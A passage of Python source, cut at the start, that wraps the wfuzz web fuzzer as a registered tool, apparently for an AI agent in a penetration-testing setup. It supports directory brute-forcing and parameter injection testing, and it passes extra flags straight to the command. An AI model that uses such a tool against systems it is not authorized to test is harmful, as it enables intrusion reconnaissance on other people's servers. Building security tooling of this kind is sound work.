        return "Error: url is required. Use FUZZ as placeholder (e.g. http://target/FUZZ or ?param=FUZZ)."
    if not shutil.which("wfuzz"):
        return "Error: wfuzz not found in PATH. Install: pip install wfuzz"

    cmd = ["wfuzz", "-w", wordlist]
    if filter_code:
        cmd += ["--hc", filter_code]
    if extra:
        cmd += extra.split()
    cmd.append(url)

    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "wfuzz_scan", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or "Wfuzz scan completed with no results."


register(
    Tool(
        name="wfuzz_scan",
        description="Web application fuzzing with Wfuzz. Use FUZZ placeholder in URL for directory/file brute-forcing, or in parameters for injection testing. Supports custom wordlists and response filtering.",
        inputSchema={
            "type": "object",
            "required": ["url"],
            "properties": {
                "url": {"type": "string", "description": "URL with FUZZ placeholder (e.g. http://target/FUZZ or http://target/?id=FUZZ)"},
                "wordlist": {"type": "string", "description": "Wordlist path (default: /usr/share/wordlists/dirb/common.txt)"},
                "filter_code": {"type": "string", "description": "Hide responses with these HTTP codes (e.g. '404,403')"},
                "additional_args": {"type": "string", "description": "Extra wfuzz flags (e.g. '-H Cookie:...')"},
                "timeout": {"type": "integer", "description": "Timeout in seconds (default: 120)"},
                "project_id": {"type": "integer"},
            },
        },
    ),
    _wfuzz_scan,
)
